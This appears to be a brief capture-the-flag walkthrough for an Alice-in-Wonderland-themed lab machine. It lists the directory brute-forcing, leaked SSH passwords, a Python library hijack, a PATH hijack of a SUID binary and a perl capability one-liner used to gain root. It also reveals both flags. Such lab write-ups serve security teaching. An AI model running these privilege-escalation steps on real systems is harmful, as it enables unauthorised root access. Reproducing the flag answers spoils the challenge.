# User.txt

gobuster to go down the rabbit hole `ip/r/a/b/b/i/t`  
ssh credentials in the source code `alice:HowDothTheLittleCrocodileImproveHisShiningTail`  
`sudo -l` shows that the python file can be executed as sudo  
python file that fetches the random library -> replace the random.py file with a custom one `import os; os.system("/bin/bash")`  
`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`  
user.txt in /root/user.txt  

<details>
<summary>user.txt</summary>
thm{"Curiouser and curiouser!"}
</details>

# root.txt

download the teaParty file `python3 -m http.server` `wget 10.10.24.255:8000/teaParty`  
decompile the file with ghidra  
see that it calls the date library which is stored in /usr/bin  
create a file called date in /tmp `#!/bin/bash; /bin/bash` -> this file gets called with the suid bit set --> make the file executable  
write /tmp to the path `export PATH=/tmp:$PATH` so that it is before /usr/bin --> our file gets found and executed before the original date file  
execute the teaparty file and get hatter's credentials `hatter:WhyIsARavenLikeAWritingDesk?`  
ssh in as hatter  


get linpeas to the machine with a simple python http server  
linpeas shows a perl capability vulnerability `/usr/bin/perl5.26.1 = cap_setuid+ep`  
gtfo --> perl --> capabilities --> `/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`  
root.txt in /home/alice  

<details>
<summary>root.txt</summary>
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
</details>